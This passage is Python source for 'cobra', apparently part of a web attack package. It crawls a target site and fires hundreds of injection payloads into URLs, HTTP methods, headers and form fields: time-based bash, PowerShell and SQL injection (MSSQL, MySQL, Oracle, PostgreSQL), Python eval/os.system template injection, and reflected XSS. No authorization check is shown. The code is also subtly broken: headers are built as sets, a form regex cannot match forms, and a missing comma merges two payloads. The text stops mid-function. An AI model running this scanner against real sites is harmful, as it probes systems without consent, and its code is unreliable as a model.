import random
import re
import string
import time
import urllib.parse
from urllib.error import HTTPError
from TheSilent.clear import clear
from TheSilent.kitten_crawler import kitten_crawler
from TheSilent.puppy_requests import text

CYAN = "\033[1;36m"
GREEN = "\033[0;32m"
RED = "\033[1;31m"

def cobra(host,delay=0,crawl=1):
    hits = []
    
    clear()
    host = host.rstrip("/")

    mal_bash = [r"sleep 60",
                r"\s\l\e\e\p \6\0",
                r"$(echo -e '\x73\x6C\x65\x65\x70\x20\x36\x30')",
                r"sleep 60 #",
                r"\s\l\e\e\p \6\0 #",
                r"$(echo -e '\x73\x6C\x65\x65\x70\x20\x36\x30') #"]
 
    mal_emoji = [r"&#128124;",
                 r"&#128293;",
                 r"&#128568;",
                 r"&#128049;",
                 r"&#127814;",
                 r"&#x1F47C",
                 r"&#x1F525",
                 r"&#x1F638",
                 r"&#x1F431",
                 r"&#x1F346"]

    mal_mssql = [r'WAITFOR DELAY "00:01"',
                 r'1 AND WAITFOR DELAY "00:01"',
                 r'1 OR WAITFOR DELAY "00:01"',
                 r'" 1 AND WAITFOR DELAY "00:01"',
                 r"' 1 AND WAITFOR DELAY '00:01'",
                 r'" 1 OR WAITFOR DELAY "00:01"',
                 r"' 1 OR WAITFOR DELAY '00:01'",
                 r'AND WAITFOR DELAY "00:01"',
                 r'OR WAITFOR DELAY "00:01"',
                 r'" AND WAITFOR DELAY "00:01"',
                 r"' OR WAITFOR DELAY '00:01'",
                 r'WAITFOR DELAY "00:01" --',
                 r'1 AND WAITFOR DELAY "00:01" --',
                 r'1 OR WAITFOR DELAY "00:01" --',
                 r'" 1 AND WAITFOR DELAY "00:01" --',
                 r"' 1 AND WAITFOR DELAY '00:01' --",
                 r'" 1 OR WAITFOR DELAY "00:01" --',
                 r"' 1 OR WAITFOR DELAY '00:01' --",
                 r'AND WAITFOR DELAY "00:01" --',
                 r'OR WAITFOR DELAY "00:01" --',
                 r'" AND WAITFOR DELAY "00:01" --',
                 r"' OR WAITFOR DELAY '00:01' --"]

    mal_mysql = [r"SELECT SLEEP(60);",
                 r"1 AND SELECT SLEEP(60);",
                 r"1 OR SELECT SLEEP(60);",
                 r"' 1 AND SELECT SLEEP(60);",
                 r'" 1 AND SELECT SLEEP(60);',
                 r"' 1 OR SELECT SLEEP(60);",
                 r'" 1 OR SELECT SLEEP(60);',
                 r'AND SELECT SLEEP(60);"',
                 r'OR SELECT SLEEP(60);',
                 r'" AND SELECT SLEEP(60);',
                 r"' OR SELECT SLEEP(60);",
                 r"SELECT SLEEP(60); --",
                 r"1 AND SELECT SLEEP(60); --",
                 r"1 OR SELECT SLEEP(60); --",
                 r"' 1 AND SELECT SLEEP(60); --",
                 r'" 1 AND SELECT SLEEP(60); --',
                 r"' 1 OR SELECT SLEEP(60); --",
                 r'" 1 OR SELECT SLEEP(60); --',
                 r'AND SELECT SLEEP(60);" --',
                 r'OR SELECT SLEEP(60); --',
                 r'" AND SELECT SLEEP(60); --',
                 r"' OR SELECT SLEEP(60); --"]

    mal_oracle_sql = [r"DBMS_LOCK.sleep(60);",
                  r"1 AND DBMS_LOCK.sleep(60);",
                  r"1 OR DBMS_LOCK.sleep(60);",
                  r"' 1 AND DBMS_LOCK.sleep(60);",
                  r'" 1 AND DBMS_LOCK.sleep(60);',
                  r"' 1 OR DBMS_LOCK.sleep(60);",
                  r'" 1 OR DBMS_LOCK.sleep(60);',
                  r"DBMS_SESSION.sleep(60);"
                  r"1 AND DBMS_SESSION.sleep(60);",
                  r"1 OR DBMS_SESSION.sleep(60);",
                  r"' 1 AND DBMS_SESSION.sleep(60);",
                  r'" 1 AND DBMS_SESSION.sleep(60);',
                  r"' 1 OR DBMS_SESSION.sleep(60);",
                  r'" 1 OR DBMS_SESSION.sleep(60);',
                  r'AND DBMS_LOCK.sleep(60)',
                  r'OR DBMS_LOCK.sleep(60)',
                  r'" AND DBMS_LOCK.sleep(60)',
                  r"' OR DBMS_LOCK.sleep(60)",
                  r'AND DBMS_SESSION.sleep(60);',
                  r'OR DBMS_SESSION.sleep(60);',
                  r'" AND DBMS_SESSION.sleep(60);',
                  r"' OR DBMS_SESSION.sleep(60);",
                  r"DBMS_LOCK.sleep(60); --",
                  r"1 AND DBMS_LOCK.sleep(60); --",
                  r"1 OR DBMS_LOCK.sleep(60); --",
                  r"' 1 AND DBMS_LOCK.sleep(60); --",
                  r'" 1 AND DBMS_LOCK.sleep(60); --',
                  r"' 1 OR DBMS_LOCK.sleep(60); --",
                  r'" 1 OR DBMS_LOCK.sleep(60); --',
                  r"DBMS_SESSION.sleep(60); --"
                  r"1 AND DBMS_SESSION.sleep(60); --",
                  r"1 OR DBMS_SESSION.sleep(60);--",
                  r"' 1 AND DBMS_SESSION.sleep(60); --",
                  r'" 1 AND DBMS_SESSION.sleep(60); --',
                  r"' 1 OR DBMS_SESSION.sleep(60); --",
                  r'" 1 OR DBMS_SESSION.sleep(60); --',
                  r'AND DBMS_LOCK.sleep(60) --',
                  r'OR DBMS_LOCK.sleep(60) --',
                  r'" AND DBMS_LOCK.sleep(60) --',
                  r"' OR DBMS_LOCK.sleep(60) --",
                  r'AND DBMS_SESSION.sleep(60); --',
                  r'OR DBMS_SESSION.sleep(60); --',
                  r'" AND DBMS_SESSION.sleep(60); --',
                  r"' OR DBMS_SESSION.sleep(60); --"]
    

    mal_php = [r"sleep(60);"]

    mal_postgresql = [r"pg_sleep(60);",
                      r"1 AND pg_sleep(60);",
                      r"1 OR pg_sleep(60);",
                      r"' 1 AND pg_sleep(60);",
                      r'" 1 AND pg_sleep(60);',
                      r"' 1 OR pg_sleep(60);",
                      r'" 1 OR pg_sleep(60);',
                      r"PERFORM pg_sleep(60);",
                      r"1 AND PERFORM pg_sleep(60);",
                      r"1 OR PERFORM pg_sleep(60);",
                      r"' 1 AND PERFORM pg_sleep(60);",
                      r'" 1 AND PERFORM pg_sleep(60);',
                      r"' 1 OR PERFORM pg_sleep(60);",
                      r'" 1 OR PERFORM pg_sleep(60);',
                      r"SELECT pg_sleep(60);",
                      r"1 AND SELECT pg_sleep(60);",
                      r"1 OR SELECT pg_sleep(60);",
                      r"' 1 AND SELECT pg_sleep(60);",
                      r'" 1 AND SELECT pg_sleep(60);',
                      r"' 1 OR SELECT pg_sleep(60);",
                      r'" 1 OR SELECT pg_sleep(60);',
                      r'AND pg_sleep(60);',
                      r'OR pg_sleep(60);',
                      r'" AND pg_sleep(60);',
                      r"' OR pg_sleep(60);",
                      r'AND PERFORM pg_sleep(60);',
                      r'OR PERFORM pg_sleep(60);',
                      r'" AND PERFORM pg_sleep(60);',
                      r"' OR PERFORM pg_sleep(60);",
                      r'AND SELECT pg_sleep(60);',
                      r'OR SELECT pg_sleep(60);',
                      r'" AND SELECT pg_sleep(60);',
                      r"' OR SELECT pg_sleep(60);",
                      r"pg_sleep(60); --",
                      r"1 AND pg_sleep(60); --",
                      r"1 OR pg_sleep(60); --",
                      r"' 1 AND pg_sleep(60); --",
                      r'" 1 AND pg_sleep(60); --',
                      r"' 1 OR pg_sleep(60); --",
                      r'" 1 OR pg_sleep(60); --',
                      r"PERFORM pg_sleep(60); --",
                      r"1 AND PERFORM pg_sleep(60); --",
                      r"1 OR PERFORM pg_sleep(60); --",
                      r"' 1 AND PERFORM pg_sleep(60); --",
                      r'" 1 AND PERFORM pg_sleep(60); --',
                      r"' 1 OR PERFORM pg_sleep(60); --",
                      r'" 1 OR PERFORM pg_sleep(60); --',
                      r"SELECT pg_sleep(60); --",
                      r"1 AND SELECT pg_sleep(60); --",
                      r"1 OR SELECT pg_sleep(60); --",
                      r"' 1 AND SELECT pg_sleep(60); --",
                      r'" 1 AND SELECT pg_sleep(60); --',
                      r"' 1 OR SELECT pg_sleep(60); --",
                      r'" 1 OR SELECT pg_sleep(60); --',
                      r'AND pg_sleep(60); --',
                      r'OR pg_sleep(60); --',
                      r'" AND pg_sleep(60); --',
                      r"' OR pg_sleep(60); --",
                      r'AND PERFORM pg_sleep(60); --',
                      r'OR PERFORM pg_sleep(60); --',
                      r'" AND PERFORM pg_sleep(60); --',
                      r"' OR PERFORM pg_sleep(60); --",
                      r'AND SELECT pg_sleep(60); --',
                      r'OR SELECT pg_sleep(60); --',
                      r'" AND SELECT pg_sleep(60); --',
                      r"' OR SELECT pg_sleep(60); --"]

    mal_powershell = [r"start-sleep -seconds 60",
                      r"start-sleep -seconds 60 #"]
    

    mal_python_reflective = [r"{{ <script>prompt(1)</script> }}",
                            r"{% <script>prompt(1)</script> %}",
                            r"return HttpResponse('<script>prompt(1)</script>')",
                            r"return render_template('<script>prompt(1)</script>')"]

    mal_python_time = [r"time.sleep(60)",
                       r"__import__('time').sleep(60)",
                       r"__import__('os').system('sleep 60')",
                       r'eval("__import__(\'time\').sleep(60)")',
                       r'eval("__import__(\'os\').system(\'sleep 60\')")',
                       r'exec("__import__(\'time\').sleep(60)")',
                       r'exec("__import__(\'os\').system(\'sleep 60\')")',
                       r'exec("import time\ntime.sleep(60)',
                       r'exec("import os\nos.system(\'sleep 60\')")',
                       r"time.sleep(60) #",
                       r"__import__('os').system('sleep 60') #",
                       r'eval("__import__(\'time\').sleep(60)") #',
                       r'eval("__import__(\'os\').system(\'sleep 60\')") #',
                       r'exec("__import__(\'time\').sleep(60)") #',
                       r'exec("__import__(\'os\').system(\'sleep 60\')") #',
                       r'exec("import time\ntime.sleep(60) #',
                       r'exec("import os\nos.system(\'sleep 60\')") #',
                       r"{{ time.sleep(60) }}",
                       r"{{ __import__('time').sleep(60) }}",
                       r"{{ __import__('os').system('sleep 60') }}",
                       r'{{ eval("__import__(\'time\').sleep(60)") }}',
                       r'{{ eval("__import__(\'os\').system(\'sleep 60\')") }}',
                       r'{{ exec("__import__(\'time\').sleep(60)") }}',
                       r'{{ exec("__import__(\'os\').system(\'sleep 60\')") }}',
                       r'{{ exec("import time\ntime.sleep(60) }}',
                       r'{{ exec("import os\nos.system(\'sleep 60\')") }}',
                       r"{{ time.sleep(60) }} #",
                       r"{{ __import__('os').system('sleep 60') }} #",
                       r'{{ eval("__import__(\'time\').sleep(60)") }} #',
                       r'{{ eval("__import__(\'os\').system(\'sleep 60\')") }} #',
                       r'{{ exec("__import__(\'time\').sleep(60)") }} #',
                       r'{{ exec("__import__(\'os\').system(\'sleep 60\')") }} #',
                       r'{{ exec("import time\ntime.sleep(60) }} #',
                       r'{{ exec("import os\nos.system(\'sleep 60\')") }} #',
                       r"{% time.sleep(60) %}",
                       r"{% __import__('time').sleep(60) %}",
                       r"{% __import__('os').system('sleep 60') %}",
                       r'{% eval("__import__(\'time\').sleep(60)") %}',
                       r'{% eval("__import__(\'os\').system(\'sleep 60\')") %}',
                       r'{% exec("__import__(\'time\').sleep(60)") %}',
                       r'{% exec("__import__(\'os\').system(\'sleep 60\')") %}',
                       r'{% exec("import time\ntime.sleep(60 %})',
                       r'{% exec("import os\nos.system(\'sleep 60\')") %}',
                       r"{% time.sleep(60) %} #",
                       r"{% __import__('os').system('sleep 60') %} #",
                       r'{% eval("__import__(\'time\').sleep(60)") %} #',
                       r'{% eval("__import__(\'os\').system(\'sleep 60\')") %} #',
                       r'{% exec("__import__(\'time\').sleep(60)") %} #',
                       r'{% exec("__import__(\'os\').system(\'sleep 60\')") %} #',
                       r'{% exec("import time\ntime.sleep(60) %} #',
                       r'{% exec("import os\nos.system(\'sleep 60\')") %} #',
                       r"return render_template(time.sleep(60))",
                       r"return render_template(__import__('time').sleep(60))",
                       r"return render_template(__import__('os').system('sleep 60'))",
                       r'return render_template(eval("__import__(\'time\').sleep(60)"))',
                       r'return render_template(eval("__import__(\'os\').system(\'sleep 60\')"))',
                       r'return render_template(exec("__import__(\'time\').sleep(60)"))',
                       r'return render_template(exec("__import__(\'os\').system(\'sleep 60\')"))',
                       r'return render_template(exec("import time\ntime.sleep(60))',
                       r'return render_template(exec("import os\nos.system(\'sleep 60\')"))',
                       r"return render_template(time.sleep(60)) #",
                       r"return render_template(__import__('os').system('sleep 60')) #",
                       r'return render_template(eval("__import__(\'time\').sleep(60)")) #',
                       r'return render_template(eval("__import__(\'os\').system(\'sleep 60\')")) #',
                       r'return render_template(exec("__import__(\'time\').sleep(60)")) #',
                       r'return render_template(exec("__import__(\'os\').system(\'sleep 60\')")) #',
                       r'return render_template(exec("import time\ntime.sleep(60)) #',
                       r'return render_template(exec("import os\nos.system(\'sleep 60\')")) #',
                       r"return HttpResponse(time.sleep(60))",
                       r"return HttpResponse(__import__('time').sleep(60))",
                       r"return HttpResponse(__import__('os').system('sleep 60'))",
                       r'return HttpResponse(eval("__import__(\'time\').sleep(60)"))',
                       r'return HttpResponse(eval("__import__(\'os\').system(\'sleep 60\')"))',
                       r'return HttpResponse(exec("__import__(\'time\').sleep(60)"))',
                       r'return HttpResponse(exec("__import__(\'os\').system(\'sleep 60\')"))',
                       r'return HttpResponse(exec("import time\ntime.sleep(60))',
                       r'return HttpResponse(exec("import os\nos.system(\'sleep 60\')"))',
                       r"return HttpResponse(time.sleep(60)) #",
                       r"return HttpResponse(__import__('os').system('sleep 60')) #",
                       r'return HttpResponse(eval("__import__(\'time\').sleep(60)")) #',
                       r'return HttpResponse(eval("__import__(\'os\').system(\'sleep 60\')")) #',
                       r'return HttpResponse(exec("__import__(\'time\').sleep(60)")) #',
                       r'return HttpResponse(exec("__import__(\'os\').system(\'sleep 60\')")) #',
                       r'return HttpResponse(exec("import time\ntime.sleep(60)) #',
                       r'return HttpResponse(exec("import os\nos.system(\'sleep 60\')")) #']

    mal_reflective_xss = [r"<iframe>cobra</iframe>",
               r"<p>cobra</p>",
               r"<script>alert('cobra')</script>",
               r"<script>prompt('cobra')</script>",
               r"<strong>cobra</strong>",
               r"<style>body{background-color:red;}</style>",
               r"<title>cobra</title>",
               r"' <iframe>cobra</iframe>",
               r"' <p>cobra</p>",
               r"' <script>alert('cobra')</script>",
               r"' <script>prompt('cobra')</script>",
               r"' <strong>cobra</strong>",
               r"' <style>body{background-color:red;}</style>",
               r"' <title>cobra</title>",
               r'" <iframe>cobra</iframe>',
               r'" <p>cobra</p>',
               r'" <script>alert("cobra")</script>',
               r'" <script>prompt("cobra")</script>',
               r'" <strong>cobra</strong>',
               r'" <style>body{background-color:red;}</style>',
               r'" <title>cobra</title>',
               r"'/> <iframe>cobra</iframe>",
               r"'/> <p>cobra</p>",
               r"'/> <script>alert('cobra')</script>",
               r"'/> <script>prompt('cobra')</script>",
               r"'/> <strong>cobra</strong>",
               r"'/> <style>body{background-color:red;}</style>",
               r"'/> <title>cobra</title>",
               r'"/> <iframe>cobra</iframe>',
               r'"/> <p>cobra</p>',
               r'"/> <script>alert("cobra")</script>',
               r'"/> <script>prompt("cobra")</script>',
               r'"/> <strong>cobra</strong>',
               r'"/> <style>body{background-color:red;}</style>',
               r'"/> <title>cobra</title>',
               r"'> <iframe>cobra</iframe>",
               r"'> <p>cobra</p>",
               r"'> <script>alert('cobra')</script>",
               r"'> <script>prompt('cobra')</script>",
               r"'> <strong>cobra</strong>",
               r"'> <style>body{background-color:red;}</style>",
               r"'> <title>cobra</title>",
               r'"> <iframe>cobra</iframe>',
               r'"> <p>cobra</p>',
               r'"> <script>alert("cobra")</script>',
               r'"> <script>prompt("cobra")</script>',
               r'"> <strong>cobra</strong>',
               r'"> <style>body{background-color:red;}</style>',
               r'"> <title>cobra</title>',
               r"/> <iframe>cobra</iframe>",
               r"/> <p>cobra</p>",
               r"/> <script>alert('cobra')</script>",
               r"/> <script>prompt('cobra')</script>",
               r"/> <strong>cobra</strong>",
               r"/> <style>body{background-color:red;}</style>",
               r"/> <title>cobra</title>",
               r"> <iframe>cobra</iframe>",
               r"> <p>cobra</p>",
               r"> <script>alert('cobra')</script>",
               r"> <script>prompt('cobra')</script>",
               r"> <strong>cobra</strong>",
               r"> <style>body{background-color:red;}</style>",
               r"> <title>cobra</title>",
               r"<iframe>cobra</iframe> //",
               r"<p>cobra</p> //",
               r"<script>alert('cobra')</script> //",
               r"<script>prompt('cobra')</script> //",
               r"<strong>cobra</strong> //",
               r"<style>body{background-color:red;}</style> //",
               r"<title>cobra</title> //",
               r"' <iframe>cobra</iframe> //",
               r"' <p>cobra</p> /",
               r"' <script>alert('cobra')</script> //",
               r"' <script>prompt('cobra')</script> //",
               r"' <strong>cobra</strong> //",
               r"' <style>body{background-color:red;}</style> //",
               r"' <title>cobra</title> //",
               r'" <iframe>cobra</iframe> //',
               r'" <p>cobra</p> //',
               r'" <script>alert("cobra")</script> //',
               r'" <script>prompt("cobra")</script> //',
               r'" <strong>cobra</strong> //',
               r'" <style>body{background-color:red;}</style> //',
               r'" <title>cobra</title> //',
               r"'/> <iframe>cobra</iframe> //",
               r"'/> <p>cobra</p> //",
               r"'/> <script>alert('cobra')</script> //",
               r"'/> <script>prompt('cobra')</script> //",
               r"'/> <strong>cobra</strong> //",
               r"'/> <style>body{background-color:red;}</style> //",
               r"'/> <title>cobra</title> //",
               r'"/> <iframe>cobra</iframe> //',
               r'"/> <p>cobra</p> //',
               r'"/> <script>alert("cobra")</script> //',
               r'"/> <script>prompt("cobra")</script> //',
               r'"/> <strong>cobra</strong> //',
               r'"/> <style>body{background-color:red;}</style> //',
               r'"/> <title>cobra</title> //',
               r"'> <iframe>cobra</iframe> //",
               r"'> <p>cobra</p> //",
               r"'> <script>alert('cobra')</script> //",
               r"'> <script>prompt('cobra')</script> //",
               r"'> <strong>cobra</strong> //",
               r"'> <style>body{background-color:red;}</style> //",
               r"'> <title>cobra</title> //",
               r'"> <iframe>cobra</iframe> //',
               r'"> <p>cobra</p> //',
               r'"> <script>alert("cobra")</script> //',
               r'"> <script>prompt("cobra")</script> //',
               r'"> <strong>cobra</strong> //',
               r'"> <style>body{background-color:red;}</style> //',
               r'"> <title>cobra</title> //',
               r"/> <iframe>cobra</iframe> //",
               r"/> <p>cobra</p> //",
               r"/> <script>alert('cobra')</script> //",
               r"/> <script>prompt('cobra')</script> //",
               r"/> <strong>cobra</strong> //",
               r"/> <style>body{background-color:red;}</style> //",
               r"/> <title>cobra</title> //",
               r"> <iframe>cobra</iframe> //",
               r"> <p>cobra</p> //",
               r"> <script>alert('cobra')</script> //",
               r"> <script>prompt('cobra')</script> //",
               r"> <strong>cobra</strong> //",
               r"> <style>body{background-color:red;}</style> //",
               r"> <title>cobra</title> //",
               r"<iframe>cobra</iframe> <!--",
               r"<p>cobra</p> <!--",
               r"<script>alert('cobra')</script> <!--",
               r"<script>prompt('cobra')</script> <!--",
               r"<strong>cobra</strong> <!--",
               r"<style>body{background-color:red;}</style> <!--",
               r"<title>cobra</title> <!--",
               r"' <iframe>cobra</iframe> <!--",
               r"' <p>cobra</p> <!--",
               r"' <script>alert('cobra')</script> <!--",
               r"' <script>prompt('cobra')</script> <!--",
               r"' <strong>cobra</strong> <!--",
               r"' <style>body{background-color:red;}</style> <!--",
               r"' <title>cobra</title> <!--",
               r'" <iframe>cobra</iframe> <!--',
               r'" <p>cobra</p> <!--',
               r'" <script>alert("cobra")</script> <!--',
               r'" <script>prompt("cobra")</script> <!--',
               r'" <strong>cobra</strong> <!--',
               r'" <style>body{background-color:red;}</style> <!--',
               r'" <title>cobra</title> <!--',
               r"'/> <iframe>cobra</iframe> <!--",
               r"'/> <p>cobra</p> <!--",
               r"'/> <script>alert('cobra')</script> <!--",
               r"'/> <script>prompt('cobra')</script> <!--",
               r"'/> <strong>cobra</strong> <!--",
               r"'/> <style>body{background-color:red;}</style> <!--",
               r"'/> <title>cobra</title> <!--",
               r'"/> <iframe>cobra</iframe> <!--',
               r'"/> <p>cobra</p> <!--',
               r'"/> <script>alert("cobra")</script> <!--',
               r'"/> <script>prompt("cobra")</script> <!--',
               r'"/> <strong>cobra</strong> <!--',
               r'"/> <style>body{background-color:red;}</style> <!--',
               r'"/> <title>cobra</title> <!--',
               r"'> <iframe>cobra</iframe> <!--",
               r"'> <p>cobra</p> <!--",
               r"'> <script>alert('cobra')</script> <!--",
               r"'> <script>prompt('cobra')</script> <!--",
               r"'> <strong>cobra</strong> <!--",
               r"'> <style>body{background-color:red;}</style> <!--",
               r"'> <title>cobra</title> <!--",
               r'"> <iframe>cobra</iframe> <!--',
               r'"> <p>cobra</p> <!--',
               r'"> <script>alert("cobra")</script> <!--',
               r'"> <script>prompt("cobra")</script> <!--',
               r'"> <strong>cobra</strong> <!--',
               r'"> <style>body{background-color:red;}</style> <!--',
               r'"> <title>cobra</title> <!--',
               r"/> <iframe>cobra</iframe> <!--",
               r"/> <p>cobra</p> <!--",
               r"/> <script>alert('cobra')</script> <!--",
               r"/> <script>prompt('cobra')</script> <!--",
               r"/> <strong>cobra</strong> <!--",
               r"/> <style>body{background-color:red;}</style> <!--",
               r"/> <title>cobra</title> <!--",
               r"> <iframe>cobra</iframe> <!--",
               r"> <p>cobra</p> <!--",
               r"> <script>alert('cobra')</script> <!--",
               r"> <script>prompt('cobra')</script> <!--",
               r"> <strong>cobra</strong> <!--",
               r"> <style>body{background-color:red;}</style> <!--",
               r"> <title>cobra</title> <!--"]

    hosts = kitten_crawler(host,delay,crawl)

    clear()
    for _ in hosts:
        print(CYAN + f"checking: {_}")
        time.sleep(delay)
        if urllib.parse.urlparse(host).netloc in urllib.parse.urlparse(_).netloc:
            try:
                forms = re.findall(r"<form[.\n]+form>", text(_).replace("\n",""))

            except:
                forms = []

            # check for bash injection time based payload
            print(CYAN + f"checking: {_} with bash injection time based payloads")
            for mal in mal_bash:
                try:
                    time.sleep(delay)
                    start = time.time()
                    data = text(_ + "/" + mal, timeout=120)
                    end = time.time()
                    if end - start >= 55:
                        hits.append(f"bash injection in url: {_}/{mal}")

                except HTTPError as error:
                    if error.code == 504:
                        hits.append(f"bash injection in url: {_}/{mal}")

                except:
                    pass

                try:
                    time.sleep(delay)
                    start = time.time()
                    data = text(_, method=mal, timeout=120)
                    end = time.time()
                    if end - start >= 55:
                        hits.append(f"bash injection in method ({mal}): {_}")

                except HTTPError as error:
                    if error.code == 504:
                        hits.append(f"bash injection in method ({mal}): {_}")

                except:
                    pass

                try:
                    time.sleep(delay)
                    start = time.time()
                    data = text(_, headers = {"Cookie",mal}, timeout=120)
                    end = time.time()
                    if end - start >= 55:
                        hits.append(f"bash injection in cookie ({mal}): {_}")

                except HTTPError as error:
                    if error.code == 504:
                        hits.append(f"bash injection in cookie ({mal}): {_}")

                except:
                    pass

                try:
                    time.sleep(delay)
                    start = time.time()
                    data = text(_, headers = {"Referer",mal}, timeout=120)
                    end = time.time()
                    if end - start >= 55:
                        hits.append(f"bash injection in referer ({mal}): {_}")

                except HTTPError as error:
                    if error.code == 504:
                        hits.append(f"bash injection in referer ({mal}): {_}")

                except:
                    pass

                try:
                    time.sleep(delay)
                    start = time.time()
                    data = text(_, headers = {"X-Forwarded-For",mal}, timeout=120)
                    end = time.time()
                    if end - start >= 55:
                        hits.append(f"bash injection in x-forwarded-for ({mal}): {_}")

                except HTTPError as error:
                    if error.code == 504:
                        hits.append(f"bash injection in x-forwarded-for ({mal}): {_}")

                except:
                    pass
                
                for form in forms:
                    field_list = []
                    input_field = re.findall(r"<input.+?>",form)
                    try:
                        action_field = re.findall(r"action\s*=\s*[\"\'](\S+)[\"\']",form)[0]
                        if action_field.startswith("/"):
                            action = _ + action_field

                        elif not action_field.startswith("/") and not action_field.startswith("http://") and not action_field.startswith("https://"):
                            action = _ + "/" + action_field

                        else:
                            action = action_field
                            
                    except IndexError:
                        pass

                    try:
                        method_field = re.findall(r"method\s*=\s*[\"\'](\S+)[\"\']",form)[0].upper()
                        for in_field in input_field:
                            if re.search(r"name\s*=\s*[\"\'](\S+)[\"\']",in_field) and re.search(r"type\s*=\s*[\"\'](\S+)[\"\']",in_field):
                                name_field = re.findall(r"name\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                type_field = re.findall(r"type\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                
                                try:
                                    value_field = re.findall(r"value\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                
                                except IndexError:
                                    value_field = ""
                                
                                if type_field == "submit" or type_field == "hidden":
                                    field_list.append({name_field:value_field})


                                if type_field != "submit" and type_field != "hidden":
                                    field_list.append({name_field:mal})

                                field_dict = field_list[0]
                                for init_field_dict in field_list[1:]:
                                    field_dict.update(init_field_dict)

                                time.sleep(delay)

                                if action and urllib.parse.urlparse(host).netloc in urllib.parse.urlparse(action).netloc:
                                    start = time.time()
                                    data = text(action,method=method_field,data=field_dict, timeout=120)
                                    end = time.time()
                                    if end - start >= 55:
                                        hits.append(f"bash injection in forms: {action} | {field_dict}")

                                else:
                                    start = time.time()
                                    data = text(_,method=method_field,data=field_dict, timeout=120)
                                    end = time.time()
                                    if end - start >= 55:
                                        hits.append(f"bash injection in forms: {_} | {field_dict}")

                    except HTTPError as error:
                        if error.code == 504:
                            if action and urllib.parse.urlparse(host).netloc in urllib.parse.urlparse(action).netloc:
                                hits.append(f"bash injection in forms: {action} | {field_dict}")

                            else:
                                hits.append(f"bash injection in forms: {_} | {field_dict}")

                    except:
                        pass

            # check for emoji injection based payload
            print(CYAN + f"checking: {_} with emoji injection payloads")
            for mal in mal_emoji:
                try:
                    time.sleep(delay)
                    data = text(_ + "/" + mal)
                    if mal in data:
                        hits.append(f"emoji injection in url: {_}/{mal}")

                except HTTPError as error:
                    pass

                except:
                    pass

                try:
                    time.sleep(delay)
                    start = time.time()
                    data = text(_, method=mal, timeout=120)
                    end = time.time()
                    if end - start >= 55:
                        hits.append(f"emoji injection in method ({mal}): {_}")

                except HTTPError as error:
                    if error.code == 504:
                        hits.append(f"emoji injection in method ({mal}): {_}")

                except:
                    pass

                try:
                    time.sleep(delay)
                    data = text(_, headers = {"Cookie",mal})
                    if mal in data:
                        hits.append(f"emoji injection in cookie ({mal}): {_}")

                except HTTPError as error:
                    pass

                except:
                    pass

                try:
                    time.sleep(delay)
                    data = text(_, headers = {"Referer",mal})
                    if mal in data:
                        hits.append(f"emoji injection in referer ({mal}): {_}")

                except HTTPError as error:
                    pass

                except:
                    pass

                try:
                    time.sleep(delay)
                    data = text(_, headers = {"X-Forwarded-For",mal})
                    if mal in data:
                        hits.append(f"emoji injection in x-forwarded-for ({mal}): {_}")

                except HTTPError as error:
                    pass

                except:
                    pass
                
                for form in forms:
                    field_list = []
                    input_field = re.findall(r"<input.+?>",form)
                    try:
                        action_field = re.findall(r"action\s*=\s*[\"\'](\S+)[\"\']",form)[0]
                        if action_field.startswith("/"):
                            action = _ + action_field

                        elif not action_field.startswith("/") and not action_field.startswith("http://") and not action_field.startswith("https://"):
                            action = _ + "/" + action_field

                        else:
                            action = action_field
                            
                    except IndexError:
                        pass

                    try:
                        method_field = re.findall(r"method\s*=\s*[\"\'](\S+)[\"\']",form)[0].upper()
                        for in_field in input_field:
                            if re.search(r"name\s*=\s*[\"\'](\S+)[\"\']",in_field) and re.search(r"type\s*=\s*[\"\'](\S+)[\"\']",in_field):
                                name_field = re.findall(r"name\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                type_field = re.findall(r"type\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                
                                try:
                                    value_field = re.findall(r"value\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                
                                except IndexError:
                                    value_field = ""
                                
                                if type_field == "submit" or type_field == "hidden":
                                    field_list.append({name_field:value_field})


                                if type_field != "submit" and type_field != "hidden":
                                    field_list.append({name_field:mal})

                                field_dict = field_list[0]
                                for init_field_dict in field_list[1:]:
                                    field_dict.update(init_field_dict)

                                time.sleep(delay)

                                if action and urllib.parse.urlparse(host).netloc in urllib.parse.urlparse(action).netloc:
                                    data = text(action,method=method_field,data=field_dict)
                                    if mal in data:
                                        hits.append(f"emoji injection in forms: {action} | {field_dict}")

                                else:
                                    data = text(_,method=method_field,data=field_dict)
                                    if mal in data:
                                        hits.append(f"emoji injection in forms: {_} | {field_dict}")

                    except HTTPError as error:
                        pass

                    except:
                        pass

            # check for mssql injection time based payload
            print(CYAN + f"checking: {_} with mssql injection time based payloads")
            for mal in mal_mssql:
                try:
                    time.sleep(delay)
                    start = time.time()
                    data = text(_ + "/" + mal, timeout=120)
                    end = time.time()
                    if end - start >= 55:
                        hits.append(f"mssql injection in url: {_}/{mal}")

                except HTTPError as error:
                    if error.code == 504:
                        hits.append(f"mssql injection in url: {_}/{mal}")

                except:
                    pass

                try:
                    time.sleep(delay)
                    start = time.time()
                    data = text(_, method=mal, timeout=120)
                    end = time.time()
                    if end - start >= 55:
                        hits.append(f"mssql injection in method ({mal}): {_}")

                except HTTPError as error:
                    if error.code == 504:
                        hits.append(f"mssql injection in method ({mal}): {_}")

                except:
                    pass

                try:
                    time.sleep(delay)
                    start = time.time()
                    data = text(_, headers = {"Cookie",mal}, timeout=120)
                    end = time.time()
                    if end - start >= 55:
                        hits.append(f"mssql injection in cookie ({mal}): {_}")

                except HTTPError as error:
                    if error.code == 504:
                        hits.append(f"mssql injection in cookie ({mal}): {_}")

                except:
                    pass

                try:
                    time.sleep(delay)
                    start = time.time()
                    data = text(_, headers = {"Referer",mal}, timeout=120)
                    end = time.time()
                    if end - start >= 55:
                        hits.append(f"mssql injection in referer ({mal}): {_}")

                except HTTPError as error:
                    if error.code == 504:
                        hits.append(f"mssql injection in referer ({mal}): {_}")

                except:
                    pass

                try:
                    time.sleep(delay)
                    start = time.time()
                    data = text(_, headers = {"X-Forwarded-For",mal}, timeout=120)
                    end = time.time()
                    if end - start >= 55:
                        hits.append(f"mssql injection in x-forwarded-for ({mal}): {_}")

                except HTTPError as error:
                    if error.code == 504:
                        hits.append(f"mssql injection in x-forwarded-for ({mal}): {_}")

                except:
                    pass
                
                for form in forms:
                    field_list = []
                    input_field = re.findall(r"<input.+?>",form)
                    try:
